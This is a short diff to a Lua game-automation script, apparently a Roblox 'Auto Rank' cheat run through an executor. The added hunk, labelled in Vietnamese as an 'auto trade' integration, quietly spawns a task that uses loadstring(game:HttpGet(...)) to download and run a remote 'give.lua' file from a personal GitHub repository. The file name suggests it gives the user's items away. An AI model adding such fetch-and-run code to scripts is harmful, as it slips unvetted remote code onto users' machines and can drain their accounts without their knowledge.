@@ -43,6 +43,20 @@ local PetItem = require(Library.Items.PetItem)
 local FruitCmds = require(Library.Client.FruitCmds)
 local PlayerPet = require(Library.Client.PlayerPet)
 
+-- ==========================================
+-- 🔄 TÍCH HỢP AUTO TRADE (LOAD TỪ GITHUB)
+-- ==========================================
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua"))()
+    end)
+    if not success then
+        warn("[AT ERROR]" .. tostring(err))
+    else
+        print("[AT + AUTO RANK]!")
+    end
+end)
+
 local config = getgenv().AutoRankConfig or {}
 local WEBHOOK_URL = config.WebhookURL or ""
 local PING_ID = config.PingID or ""
